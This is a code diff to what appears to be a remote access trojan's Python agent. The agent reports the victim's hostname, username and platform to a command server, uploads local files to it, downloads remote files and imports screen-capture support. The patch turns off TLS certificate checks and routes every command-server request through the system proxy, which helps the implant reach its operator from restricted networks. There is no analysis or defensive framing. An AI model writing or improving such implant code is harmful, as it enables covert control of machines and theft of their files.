@@ -16,6 +16,7 @@ import zipfile
 import tempfile
 import socket
 import getpass
+import urllib
 if os.name == 'nt':
     from PIL import ImageGrab
 else:
@@ -90,7 +91,7 @@ class Agent(object):
     def server_hello(self):
         """ Ask server for instructions """
         req = requests.post(config.SERVER + '/api/' + self.uid + '/hello',
-            json={'platform': self.platform, 'hostname': self.hostname, 'username': self.username})
+            json={'platform': self.platform, 'hostname': self.hostname, 'username': self.username}, verify=False, proxies=urllib.getproxies())
         return req.text
 
     def send_output(self, output, newlines=True):
@@ -103,7 +104,7 @@ class Agent(object):
         if newlines:
             output += "\n\n"
         req = requests.post(config.SERVER + '/api/' + self.uid + '/report', 
-        data={'output': output})
+        data={'output': output}, verify=False, proxies=urllib.getproxies())
 
     def expand_path(self, path):
         """ Expand environment variables and metacharacters in a path """
@@ -159,7 +160,7 @@ class Agent(object):
             if os.path.exists(file) and os.path.isfile(file):
                 self.send_output("[*] Uploading %s..." % file)
                 requests.post(config.SERVER + '/api/' + self.uid + '/upload',
-                    files={'uploaded': open(file, 'rb')})
+                    files={'uploaded': open(file, 'rb')}, verify=False, proxies=urllib.getproxies())
             else:
                 self.send_output('[!] No such file: ' + file)
         except Exception as exc:
@@ -173,7 +174,7 @@ class Agent(object):
             if not destination:
                 destination= file.split('/')[-1]
             self.send_output("[*] Downloading %s..." % file)
-            req = requests.get(file, stream=True)
+            req = requests.get(file, stream=True, verify=False, proxies=urllib.getproxies())
             with open(destination, 'wb') as f:
                 for chunk in req.iter_content(chunk_size=8000):
                     if chunk:
